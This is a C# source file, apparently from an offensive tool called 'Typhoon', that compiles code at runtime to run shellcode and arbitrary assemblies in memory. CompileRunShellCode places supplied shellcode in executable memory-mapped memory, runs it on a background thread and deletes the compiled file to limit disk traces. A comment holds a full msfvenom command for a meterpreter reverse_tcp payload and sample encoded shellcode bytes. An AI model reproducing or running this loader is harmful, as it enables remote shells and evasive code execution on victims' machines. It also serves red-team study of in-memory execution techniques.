using System;
using System.IO;
using System.Reflection;
using System.CodeDom.Compiler;
using System.Linq;
using AppDomainToolkit;
using System.Collections.Generic;
using System.Threading;
using System.Diagnostics;
using Microsoft.CSharp.RuntimeBinder;
using Typhoon.Utils;

namespace Typhoon
{

    public static class DynCSharpRunner
    {
        /// <summary>
        /// Compile and Run Shellcode
        /// A couple of methods that could be used to lauch Shellcode:
        /// Method 1. loading shellcode in memory mapped I/O, pointing execution there via unsafe poijnter: below
        /// Method 2. Allocating virtual memory in the process https://holdmybeer.xyz/2016/09/11/c-to-windows-meterpreter-in-10mins/ 
        /// </summary>
        /// <param name="ShellCode"></param>
        /// <returns></returns>
        internal static bool CompileRunShellCode(string ShellCode)
        {
            /* Example:
                private WorkThreadFunction(ShellCode){
                    DynCSharpRunner.CompileRunShellCode(ShellCode);
                }
               //msfvenom  -p windows/meterpreter/reverse_tcp --platform windows ReverseConnectRetries=255   
                            PrependMigrate=true  LHOST=172.16.56.230 LPORT=1337 -e x86/shikata_ga_nai -i 3 -f  csharp 
                String ShellCode = @"
                    0xdb,0xc0,0xb8,0x22,0x07,0x27,0xf3,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,
                    0x61,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0xd7,0xba,0x1c,0x88,
                    0xb0,0x69,0xed,0x38,0xfb,0x8e,0x25,0x5a,0x04 ....
                    ";


                    Thread thread = new Thread(new ThreadStart(WorkThreadFunction));
                    thread.IsBackground = true;
                    thread.Start();
            */

            // Determine the name of the assembly e are in, so we do not include it on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();
            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic) //is necessary because a dynamic assembly will throw and exception when calling a.Location
                        .Select(a => a.Location)
                        .ToArray();


            // Create a separate AppDomain, mainly so we can unload assembly cleanly, and delete temporary assembly in disk bypassing file locking
            using (var context = AppDomainContext.Create())
            {

                // Code Wrapper for snippet we are compiling.
                // It will include shellcode in C# source code and dynamically compile it. 
                // See comments on ho MMF I/O is done
                #region Snippet
                String SnippetPreamble = @"
                            namespace DynamicShellCode {

                              using System;
                              using System.IO.MemoryMappedFiles;
                              using System.Runtime.InteropServices;

                              public class DynamicShellCodeCompile{ 

                                private delegate IntPtr GetPebDelegate();
                                public void GetResults(){
                                        this.GetPeb();
                                }
                                private unsafe IntPtr GetPeb()
                                {
                                   var shellcode = new byte[]
                                   {
                            ";
                String SnippetPostAmble = @" 
                                   };
 
                                   MemoryMappedFile mmf = null;
                                   MemoryMappedViewAccessor mmva = null;
                                   try
                                   {
                                        // Create a read/write/executable memory mapped file to hold our shellcode..
                                        mmf = MemoryMappedFile.CreateNew(""__shellcode"", 
                                                    shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

                                        // Create a memory mapped view accessor with read/write/execute permissions..
                                        mmva = mmf.CreateViewAccessor(0, shellcode.Length, 
                                                    MemoryMappedFileAccess.ReadWriteExecute);

                                        // Write the shellcode to the MMF..
                                        mmva.WriteArray(0, shellcode, 0, shellcode.Length);

                                        // Obtain a pointer to our MMF..
                                        var pointer = (byte*)0;
                                        mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

                                        // Create a function delegate to the shellcode in our MMF..
                                        var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), 
                                                                    typeof(GetPebDelegate));

                                        // Invoke the shellcode..
                                        return func();
                                    }
                                    catch
                                    {
                                        return IntPtr.Zero;
                                    }
                                    finally
                                    {
                                        mmva.Dispose();
                                        mmf.Dispose();
                                    }
                                }
                              }
                            }
                            ";

                String SourceCode = SnippetPreamble + ShellCode + SnippetPostAmble;

                #endregion ScriptText

                // Grab CodeDom compiler.
                // TODO: logic to avoid reliance on the version, but figure out what is available
                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                    new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });

                // Include assemblies / dependencies in the compilation 
                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                // In-memory generation is a misnomer. There are some artifacts left on disk, 
                // in-memory really means `in temp`
                // Example of artifacts for in-memory compilation and preservation of temp files:
                /*
                 * λ dir "C:\Users\dimas\AppData\Local\Temp\tmp*"
                     Volume in drive C has no label.
                     Volume Serial Number is ECBC-2429

                    Directory of C:\Users\dimas\AppData\Local\Temp

                    08/12/2017  10:31 PM                 0 tmp16A6.tmp
                    08/12/2017  10:30 PM                 0 tmpF581.tmp
                    08/12/2017  10:32 PM             2,080 1vvp5flt.0.cs

                    If temp files are preserved we see:
                    08/12/2017  10:32 PM               778 1vvp5flt.cmdline
                    08/12/2017  10:32 PM                 0 1vvp5flt.err
                    08/12/2017  10:32 PM             1,353 1vvp5flt.out
                    08/12/2017  10:32 PM                 0 1vvp5flt.tmp
                */
                parameters.GenerateInMemory = true;
                parameters.GenerateExecutable = false;
                
                // Where to generate temp files, and whether to leave them
                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true); 

                // options for the compiler. We choose `unsafe` because we want a raw pointer to the buffer containing shellcode
                // parameters.CompilerOptions += "/optimize+ ";
                // parameters.CompilerOptions += "/target:module"; 
                parameters.CompilerOptions += "/nologo /unsafe";

                // Assembly Loader wants a ".dll" or an ".exe" in the assembly name although .Net runtime does not care. We rename
                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                // We give a name to the newly generated assembly
                parameters.OutputAssembly = aPathName; 

                // The call to compile
                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);

                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                // This call to .CompiledAssembly loads the newly compile assembly into memory. 
                // Now we can release locks on the assembly file, and delete it after we get the type to run
                // Deletion of the assembly file is possible because we are executing in a new AppDomain. 
                // Normally we cannot delete an asembly if it's being used/loadded in the same AppDomain. It is locked by the process.
                var type = cr.CompiledAssembly.GetType("DynamicShellCode.DynamicShellCodeCompile");

                FileInfo fi = new FileInfo(aPathName);
                // Console.WriteLine("Exists? {0}", fi.Exists);
                // Console.WriteLine(aPathName);
                File.Delete(aPathName);

                // Invoke the type in the assembly with Activator in a separate thread. The type Executes the shellcode 
                object[] constructorArgs = new object[] { };
                dynamic instance = Activator.CreateInstance(type, constructorArgs);
                try
                {
                    Thread thread = new Thread(() => SCRunner(instance));
                    thread.IsBackground = true;
                    thread.Start();

                }
                catch { }
            }

            return true;
        }

        /// <summary>
        /// Run dynamic type and get the results of the run.
        /// </summary>
        private static void SCRunner(dynamic inst)
        {
            try
            {
                Console.WriteLine("\n--- Result ---");
                inst.GetResults();

            }catch { }
        }

        /// <summary>
        ///  Compile and run CSharp code snippets
        /// </summary>
        /// <param name="SnippetDirectives"></param>
        /// <param name="SnippetCode"></param>
        /// <returns></returns>
        internal static bool CompileRunSnippet(string SnippetDirectives, string SnippetCode)
        {

            using (var context = AppDomainContext.Create())
            {
                // What assembly we are in, do not include on load;
                Assembly currentAssem = Assembly.GetExecutingAssembly();

                String[] referencedAssemblies =
                             AppDomain.CurrentDomain.GetAssemblies()
                            .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                            .Where(a => !a.IsDynamic) //is necessary because a dynamic assembly will throw and exception when calling a.Location
                            .Select(a => a.Location)
                            .ToArray();

                // We want to bring in Micrsosoft.CSharp dll for scripts that use dynamic constructs. 
                // While the dll is         
                CSharpUtil.LoadCSCompilNamespace();


                //String[] referencedAssemblies = AppDomain.CurrentDomain.GetAssemblies()
                //    .Where( a => !a.IsDynamic)
                //    .Select(a => a.Location).ToArray();

                if (!ConfigUtil.DEBUG)
                {
                    foreach (String ra in referencedAssemblies)
                    {
                        Console.WriteLine("Including assembly: {0}", ra);
                    }
                }

                
                // A Wrapper around the snippet, with proper object disposal
                #region ScriptText
                String SnippetPreamble = @"
                            namespace Dynamic {
                              public class DynamicCompile: System.IDisposable{ 

                                private bool disposed = false;
                                public DynamicCompile(){
                                        // Console.WriteLine(""=== Dynamic CScript === "");
                                }                                
                                public void GetResults(){
                                    try {
                                    ";

                String SnippetPostAmble = @" 
                                    }catch(Exception e){
                                        Console.WriteLine(""Exception : {0} "", e);
                                    }
                                } 

                                //Implement IDisposable.
                                public void Dispose()
                                {
                                    Dispose(true);
                                    GC.SuppressFinalize(this);
                                }

                                protected virtual void Dispose(bool disposing)
                                {
                                    if (!disposed)
                                    {
                                        if (disposing)
                                        {
                                            // Free other state (managed objects).
                                        }
                                        // Free your own state (unmanaged objects).
                                        // Console.WriteLine(""=== End Dynamic CScript === "");
                                        disposed = true;
                                    }
                                }

                                // Use C# destructor syntax for finalization code.
                                ~DynamicCompile(){
                                    // Simply call Dispose(false).
                                    Dispose (false);
                                }
                              } 
                            }";

                String SourceCode = SnippetDirectives + SnippetPreamble + SnippetCode + SnippetPostAmble;

                #endregion ScriptText

                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });

                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                parameters.GenerateInMemory = true;
                parameters.GenerateExecutable = false;
                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true);
                parameters.CompilerOptions += "/nologo  /unsafe";

                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName; 
                                                      
                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                var type = cr.CompiledAssembly.GetType("Dynamic.DynamicCompile");

                FileInfo fi = new FileInfo(aPathName);
                File.Delete(aPathName);

                object[] constructorArgs = new object[] { };
                dynamic instance = Activator.CreateInstance(type, constructorArgs);

                Console.WriteLine("\n--- Result ---");
                instance.GetResults();

                // Dispose of instances. Avoiding memory leaks (e.g. for rapid fire of calls in a loop).
                instance.Dispose();
                //GC.Collect();
                //GC.WaitForPendingFinalizers();
            }

            return true;
        }


        /// <summary>
        /// Compile and Run CSharp code via Extensions.Extensions provide a contract.
        ///  - PreLaunch()
        ///  - RunCode()
        ///  - PostLaunch()
        /// Note: Does not take referenced assemblies (yet)
        /// </summary>
        /// <param name="SourceCode"></param>
        /// <param name="TypeToRun"></param>
        /// <param name="isExe"></param>
        /// <returns></returns>
        internal static bool CompileRunXSource(string SourceCode, String TypeToRun)
        {
            Console.WriteLine("Type to run: {0}", TypeToRun);
            // What assembly we are in, do not include on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();
            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic)
                        .Select(a => a.Location)
                        .ToArray();

            if (ConfigUtil.DEBUG)
            {
                foreach (String ra in referencedAssemblies)
                {
                    Console.WriteLine("Including assembly: {0}", ra);
                }
            }
            using (var context = AppDomainContext.Create())
            {

                Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });

                CompilerParameters parameters = new CompilerParameters(
                    referencedAssemblies);

                parameters.GenerateInMemory = true;
                parameters.GenerateExecutable = false;

                parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true);
                parameters.CompilerOptions = "/unsafe+";
                String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName; 

                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return false;
                }

                var type = cr.CompiledAssembly.GetType(TypeToRun);

                FileInfo fi = new FileInfo(aPathName);
                File.Delete(aPathName);

                object[] constructorArgs = new object[] { };
                try
                {
                    dynamic instance = Activator.CreateInstance(type, constructorArgs);
                    Console.WriteLine("\n--- Result ---");
                    instance.PreLaunch(); // The pre method should always be this <-
                    instance.RunCode();   // The method should always be this <-
                    instance.PostLaunch(); // The post method should always be this <-
                    instance = null;

                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            return true;
        }

        internal static bool LoadAndRunType(string assemblyPath, String TypeToRun)
        {

            Console.WriteLine("Assembly to load: {0}", assemblyPath);
            Console.WriteLine("Type to run: {0}", TypeToRun);

            // Setup the path where we are looking for loaded Assembly dll. 
            // We are looking in the folder where Typhoon is running from
            var rootDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            Console.WriteLine("Rootdir: {0}", rootDir);
            var setupInfo = new AppDomainSetup()
            {
                ApplicationBase = rootDir,
                PrivateBinPath = rootDir
            };

            using (var context = AppDomainContext.Create(setupInfo))
            {
                context.LoadAssembly(LoadMethod.LoadFrom, assemblyPath);
                String aName = Path.GetFileNameWithoutExtension(assemblyPath);

                String[] assemblies = context.Domain.GetAssemblies().Select(a => a.FullName).ToArray();
                Assembly assemblyToRun = context.Domain.GetAssemblies()
                    .Where(a => a.FullName.StartsWith(aName, StringComparison.InvariantCultureIgnoreCase))
                    .First();

                try
                {
                    var type = assemblyToRun.GetType(TypeToRun);

                    if (type != null)
                    {
                        object[] constructorArgs = new object[] { };
                        try
                        {
                            dynamic instance = Activator.CreateInstance(type, constructorArgs);
                            Console.WriteLine("\n--- Result ---");
                            instance.PreLaunch(); // The pre method should always be this <-
                            instance.RunCode();   // The method should always be this <-
                            instance.PostLaunch(); // The post method should always be this <-
                            instance = null;

                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("Activator Exception: {0}", e.Message);
                        }
                    }
                    else
                    {
                        Console.WriteLine("Check Type {0} ?", TypeToRun);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Assembly Get Type Exception: {0}", e.Message);

                }
            }
            return false;
        }

        internal static String CompileSource(string SourceCode, bool inmemory, bool isExe, string compoptions)
        {
            // What assembly we are in, do not include on load;
            Assembly currentAssem = Assembly.GetExecutingAssembly();

            // We want to bring in Micrsosoft.CSharp dll for scripts that use dynamic constructs. 
            // While the dll is         
            CSharpUtil.LoadCSCompilNamespace();

            String[] referencedAssemblies =
                         AppDomain.CurrentDomain.GetAssemblies()
                        .Where(a => !a.FullName.StartsWith("mscorlib", StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.FullName.StartsWith(currentAssem.FullName, StringComparison.InvariantCultureIgnoreCase))
                        .Where(a => !a.IsDynamic)
                        .Select(a => a.Location)
                        .ToArray();

            AssemblyUtil.showAssembliesInDomain(AppDomain.CurrentDomain);

            Microsoft.CSharp.CSharpCodeProvider csc = new Microsoft.CSharp.CSharpCodeProvider(
                new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } });

            CompilerParameters parameters = new CompilerParameters(
                     referencedAssemblies);

            if (inmemory) { 
                parameters.GenerateInMemory = true;
            } else {
                parameters.GenerateInMemory = false;
            }

            if (isExe) {
                parameters.GenerateExecutable = true;
            } else {
                parameters.GenerateExecutable = false;
            }

            parameters.TempFiles = new TempFileCollection(Path.GetTempPath(), true);
            parameters.CompilerOptions = compoptions;
            String aPathName =
                    Path.Combine(Environment.CurrentDirectory, Path.GetFileName(Path.GetTempFileName()).Replace(".tmp", ".dll"));
                parameters.OutputAssembly = aPathName;

                CompilerResults cr = csc.CompileAssemblyFromSource(parameters, SourceCode);
                if (cr.Errors.HasErrors)
                {
                    foreach (String output in cr.Output)
                    {
                        Console.WriteLine(output);
                    }

                    return String.Empty;
                }

            return aPathName;
        }

    }

}
